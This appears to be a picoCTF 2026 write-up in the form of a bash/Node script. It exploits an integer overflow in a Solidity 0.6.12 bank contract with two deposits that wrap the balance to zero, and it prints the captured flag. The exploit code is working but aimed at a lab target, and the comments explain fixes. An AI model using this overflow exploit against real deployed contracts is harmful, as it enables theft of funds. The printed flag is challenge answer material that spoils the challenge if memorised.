#!/usr/bin/env bash
set -euo pipefail

# Challenge Name: Smart_Overflow
# Category: Blockchain
# Difficulty: Medium
# Event: picoCTF 2026
# Author: OB
#
# Description:
# "The contract tracks balances using uint256 math. It should be impossible to
# get the flag... Contract: here"
#
# Given information from the challenge:
# Web page: http://mysterious-sea.picoctf.net:52388/
# RPC node: http://mysterious-sea.picoctf.net:64343
# Provided file: IntOverflowBank.sol
#
# Core lesson:
# Solidity versions before 0.8.x do NOT automatically protect arithmetic from
# overflow and underflow.
#
# In this contract, the vulnerable line is:
# balances[msg.sender] = balances[msg.sender] + amount;
#
# The developer tries to detect overflow after the fact with:
# if (!revealed && balances[msg.sender] < amount) {
#     revealed = true;
#     emit FlagRevealed(flag);
# }
#
# That condition is actually reachable because uint256 arithmetic wraps modulo
# 2^256 in Solidity 0.6.12.
#
# Real-world analogy:
# Think of an odometer in a car. If it had only a few digits and you kept adding
# more mileage past the maximum value, it would roll over back near zero.
#
# That is exactly what happens here:
# 1 + (2^256 - 1) = 0   mod 2^256
#
# Once the wrapped result becomes smaller than the deposited amount, the
# contract's "overflow detector" reveals the flag.
#
# Step 1: Read the contract.
# Manual command:
# sed -n '1,260p' IntOverflowBank.sol
#
# Reason:
# The key functions are:
# - deposit(uint256 amount)
# - getFlag()
#
# The exploit path is entirely inside deposit(). No ether transfer is required.
# The contract only updates an internal mapping.
#
# Step 2: Understand why one deposit is not enough.
# Manual concept:
# Starting balance = 0
#
# If we call:
# deposit(MAX_UINT256)
#
# then:
# 0 + (2^256 - 1) = 2^256 - 1
#
# That does NOT overflow, because the result is still within uint256 range.
#
# So we first need a non-zero balance.
#
# Step 3: Make a tiny first deposit.
# Manual command:
# deposit(1)
#
# Reason:
# After this call:
# balances[player] = 1
#
# Now the next huge deposit can overflow.
#
# Step 4: Trigger the overflow.
# Manual command:
# deposit(2^256 - 1)
#
# Reason:
# In uint256 arithmetic:
# 1 + (2^256 - 1) = 2^256 = 0 mod 2^256
#
# So after the second deposit:
# balances[player] = 0
#
# The contract then evaluates:
# if (balances[msg.sender] < amount)
#
# which becomes:
# if (0 < 2^256 - 1)
#
# That is true, so:
# - revealed = true
# - the flag becomes accessible through getFlag()
#
# Step 5: Read the flag.
# Manual command:
# call getFlag()
#
# Reason:
# Once revealed is true, getFlag() stops reverting and returns the stored flag
# string.
#
# Step 6: Why the private key matters.
# Manual concept:
# The challenge page gives us:
# - contract address
# - player address
# - player private key
#
# We use the private key to sign transactions from the funded player account.
# This is similar to having a challenge wallet in a local lab environment.
#
# Real-world security lesson:
# Smart contracts must not rely on unchecked arithmetic in older Solidity
# versions. In production, the fix would be one of these:
# - upgrade to Solidity 0.8+
# - use SafeMath in older versions
# - validate arithmetic boundaries before updating state
#
# Flag obtained:
# picoCTF{Sm4r7_OverFL0ws_ExI5t_728375ba}

challenge_url="${1:-http://mysterious-sea.picoctf.net:52388/}"
rpc_url="${2:-http://mysterious-sea.picoctf.net:64343}"
script_dir="$(cd "$(dirname "$0")" && pwd)"

cd "$script_dir"

if [ ! -d node_modules/ethers ]; then
  npm init -y >/dev/null 2>&1
  npm install ethers@6 >/dev/null
fi

CHALLENGE_URL="$challenge_url" RPC_URL="$rpc_url" node - <<'JS'
const { ethers } = require("ethers");

async function main() {
  const challengeUrl = process.env.CHALLENGE_URL;
  const rpcUrl = process.env.RPC_URL;

  const html = await fetch(challengeUrl).then((r) => r.text());
  const addrs = [...html.matchAll(/0x[a-fA-F0-9]{40}/g)].map((m) => m[0]);
  const pkMatch = html.match(/0x[a-fA-F0-9]{64}/);

  if (addrs.length < 2 || !pkMatch) {
    throw new Error("Could not extract contract/player details from the challenge page.");
  }

  const contractAddr = addrs[0];
  const playerAddr = addrs[1];
  const privKey = pkMatch[0];

  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const wallet = new ethers.Wallet(privKey, provider);

  if ((await wallet.getAddress()).toLowerCase() !== playerAddr.toLowerCase()) {
    throw new Error("Extracted private key does not match the player address.");
  }

  const abi = [
    "function deposit(uint256 amount)",
    "function balances(address) view returns (uint256)",
    "function revealed() view returns (bool)",
    "function getFlag() view returns (string)"
  ];

  const bank = new ethers.Contract(contractAddr, abi, wallet);

  let tx = await bank.deposit(1n);
  await tx.wait();

  tx = await bank.deposit(ethers.MaxUint256);
  await tx.wait();

  const flag = await bank.getFlag();
  console.log(flag);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
JS
